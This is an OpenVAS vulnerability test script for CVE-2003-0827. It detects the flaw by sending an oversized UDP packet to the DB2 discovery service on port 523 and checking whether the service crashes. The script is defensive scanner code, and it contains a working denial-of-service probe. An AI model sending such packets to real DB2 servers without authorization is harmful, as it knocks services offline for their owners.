# OpenVAS Vulnerability Test
# $Id: db2_discovery_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: DB2 discovery service DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11896");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2003-0827");
  script_name("DB2 discovery service DOS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_require_udp_ports(523);

  script_tag(name:"solution", value:"Apply FixPack 10a or later.");

  script_tag(name:"summary", value:"It was possible to crash the DB2 UDP based discovery service
  by sending a too long packet.");

  script_tag(name:"impact", value:"An attacker  may use this attack to make this service crash
  continuously, preventing you from working properly.");

  script_tag(name:"qod_type", value:"remote_banner_unreliable");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("network_func.inc");

port = 523;
if(!get_udp_port_state(port))
  exit(0);

# There is probably a clean way to do it and change this script to
# an ACT_GATHER_INFO or ACT_MIXED...

if(!test_udp_port(port:port))
  exit(0);

s = open_sock_udp(port);
if(!s)
  exit(0);

send(socket:s, data:crap(30));
close(s);

if(!test_udp_port(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);